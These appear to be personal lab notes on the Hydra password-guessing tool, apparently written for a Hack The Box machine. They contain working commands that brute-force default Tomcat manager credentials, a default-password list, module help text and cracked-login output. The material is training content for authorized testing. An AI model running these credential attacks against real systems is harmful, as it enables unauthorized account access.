[Basic](#basic)
[Hydra Common Options](#hydra-common-options)
[Username:Password](#usernamepassword)
[Supported Services](#supported-services)
[hydra -U http-get](#hydra--u-http-get) arrangement doesn't matter
[hydra http-post-form -U](#hydra-http-post-form--u)
[HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables](#use-hydra_proxy_http-or-hydra_proxy-environment-variables-for-a-proxy-setup)
[Debug, send Hydra output to Burp](#to-debug-send-hydra-output-to-burp-use-this-in-the-same-line)
[Common Mistakes](#common-mistakes)
[Now you got it right](#now-you-got-it-right)
[Common Mistakes; variables argument needed for http-post-form](#common-mistakes-variables-argument-needed-for-http-post-form)


-----------------------------------------------

### Basic
HTB: ???
```
hydra -C creds.txt http-get://10.10.10.95:8080/manager/html
hydra -U http-get
hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
```

# Hydra Common Options
```
-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
-p PASS  or -P FILE  try password PASS, or load several passwords from FILE
-C FILE   colon separated "login:pass" format, instead of -L/-P options

-U        service module usage details
```

### Username:Password
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
Save as: labs/htb/_BeginnerTrack/Jerry/creds.txt
```
admin:password
admin:
... snip ...
tomcat:admin
tomcat:changethis
```

### Supported Services
```
Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
```

### hydra -U http-get
hydra -U http-get
hydra http-get -U
```
$ hydra -U http-get
Help for module http-get:
============================================================================
Module http-get requires the page to authenticate.
The following parameters are optional:
 (a|A)=auth-type   specify authentication mechanism to use: BASIC, NTLM or MD5
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
 (F|S)=check for text in the HTTP reply. S= means if this text is found, a
       valid account has been found, F= means if this string is present the
       combination is invalid. Note: this must be the last option supplied.
For example:  "/secret" or "http://bla.com/foo/bar:H=Cookie\: sessid=aaaa" or "https://test.com:8080/members:A=NTLM"
```

### hydra http-post-form -U
```
$ hydra http-post-form -U
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-15 17:40:15

Help for module http-post-form:
============================================================================
Module http-post-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters requires at a minimum three ":" separated values,
plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)

Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>

First is the page on the server to GET or POST to (URL), e.g. "/login".
Second is the POST/GET variables (taken from either the browser, proxy, etc.)
 without the initial '?' character and the usernames and passwords being
 replaced with "^USER^" ("^USER64^" for base64 encodings) and "^PASS^"
 ("^PASS64^" for base64 encodings).
Third are optional parameters (see below)
Last is the string that it checks for an *invalid* login (by default).
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".
 This is where most people get it wrong! You have to check the webapp what a
 failed string looks like and put it in this parameter! Add the -d switch to see
 the sent/received data!
 Note that using invalid login condition checks can result in false positives!

The following parameters are optional and are put between the form parameters
  and the condition string; seperate them too with colons:
 2=                  302 page forward return codes identify a successful attempt
 (c|C)=/page/uri     to define a different page to gather initial cookies from
 (g|G)=              skip pre-requests - only use this when no pre-cookies are required
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
                 Note: 'h' will add the user-defined header at the end
                 regardless it's already being sent by Hydra or not.
                 'H' will replace the value of that header if it exists, by the
                 one supplied by the user, or add the header at the end

Note that if you are going to put colons (:) in your headers you should escape
them with a backslash (\). All colons that are not option separators should be
escaped (see the examples above and below).
You can specify a header without escaping the colons, but that way you will not
be able to put colons in the header value itself, as they will be interpreted by
hydra as option separators.

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=result=success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
 "/exchweb/bin/auth/:F=failedowaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:C=/exchweb":reason=
```

### Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
```
$ hydra -h
... [snip] ...
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
... [snip] ...
```

### To debug, send Hydra output to Burp. Use this in the same line
```
HYDRA_PROXY_HTTP=http://localhost:8080 hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
```

### Common Mistakes
login: admin   password: admin are not the right combination, see the help above
```
$ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html

[DATA] attacking http-get://10.10.10.95:8080/manager/html
[8080][http-get] host: 10.10.10.95   login: admin   password: admin
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 2 valid passwords found

```

### Now you got it right
```
$ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'

[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries, ~2 tries per task
[DATA] attacking http-get://10.10.10.95:8080/manager/html:F=Access Denied
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 1 valid password found

```

### Common Mistakes; variables argument needed for http-post-form
```
$ hydra http-post-form://$ip
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-15 17:46:05
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[ERROR] the variables argument needs at least the strings ^USER^, ^PASS^, ^USER64^ or ^PASS64^: (null)
```

### 
Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>
```

```

### 
```

```

### 
```

```

### 
```

```